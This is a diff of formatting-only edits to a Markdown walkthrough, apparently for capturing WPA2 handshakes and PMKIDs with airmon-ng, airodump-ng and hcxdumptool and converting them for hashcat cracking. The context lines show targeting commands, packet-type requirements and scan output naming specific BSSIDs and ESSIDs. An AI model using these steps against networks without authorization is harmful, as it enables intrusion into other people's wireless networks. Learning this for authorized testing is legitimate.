@@ -25,8 +25,8 @@ sudo airmon-ng check kill
 sudo airmon-ng start <Network Interface>
 iwconfig
 ```
-> __<Network Interface>__: wlan0, wlan1 \
-> **<monitor interface>**: wlan1mon, wlan0mon \
+> **`<Network Interface>`**: wlan0, wlan1 \
+> **`<monitor interface>`**: wlan1mon, wlan0mon \
 > **network interface start success: (...for [phy1]wlan1 on [phy1]wlan1mon)** 
 
 ### Step 3: Start Monitoring
@@ -40,7 +40,7 @@ sudo airodump-ng <monitor interface>
 hcxdumptool --bpfc="wlan addr <BSSID lower case>" >> attack.bpf
 (e.g hcxdumptool --bpfc="wlan addr e894f6a008ae" >> attack.bpf)
 ```
->** <BSSID lower case>**: E8:94:F6:A0:08:AE -> e894f6a008ae     
+>**`<BSSID lower case>`**: E8:94:F6:A0:08:AE -> e894f6a008ae     
     
 ### Step 5: Packet Sniffing attack
 ```
@@ -70,11 +70,11 @@ Session Actions Edit View Help
 ```   
 
 > **EA123P**
-> **+:** Indicates a newly received packet corresponding to one of the EA123P types.
-> **1:** The challenge message sent from the Router/AP to the Client.
-> **2:** The Client's response to the Router. This is the most important; it is essential.
-> **3:** The Router's confirmation message.
-> **P:** PMKID (No user connection required / Client-less). As long as the router has roaming features enabled, the tool can interact directly with the router to capture this packet.
+> **+:** Indicates a newly received packet corresponding to one of the EA123P types. \
+> **1:** The challenge message sent from the Router/AP to the Client. \
+> **2:** The Client's response to the Router. This is the most important; it is essential. \
+> **3:** The Router's confirmation message. \
+> **P:** PMKID (No user connection required / Client-less). As long as the router has roaming features enabled, the tool can interact directly with the router to capture this packet. \
 > **Cracking Requirement: P OR 1+2**
     
 ### Step 6: Conversion to .hc22000 (hashcat support format) 
@@ -121,9 +121,9 @@ Session Actions Edit View Help
  B0:95:75:D5:5D:CB  -65        2        0    0   7  130   WPA2 CCMP   PSK  IAIS-NS-30015
  F8:94:F6:A0:08:AE  -70        2        0    0   7  130   WPA2 CCMP   PSK  IAIS-NS-30015
 ```
-> ESSID: IAIS-NS-30015
-> BSSID: F8:94:F6:A0:08:AE
-> channal: 7
+> ESSID: IAIS-NS-30015 \
+> BSSID: F8:94:F6:A0:08:AE \
+> channal: 7 \
 > ENC: WPA2
     
 2. C4:12:F5:0A:B6:07 
@@ -143,9 +143,9 @@ Session Actions Edit View Help
  B0:6E:BF:3E:E3:18  -79        1        1    0  10  195   WPA2 CCMP   PSK  FinTech_AI
  C4:12:F5:0A:B6:07  -58        4        0    0  10  270   WPA2 CCMP   PSK  IAIS-NS-30015
 ```  
-> ESSID: IAIS-NS-30015
-> BSSID: C4:12:F5:0A:B6:07
-> channal: 10
+> ESSID: IAIS-NS-30015 \
+> BSSID: C4:12:F5:0A:B6:07 \
+> channal: 10 \
 > ENC: WPA2
     
 #### Cracking result  
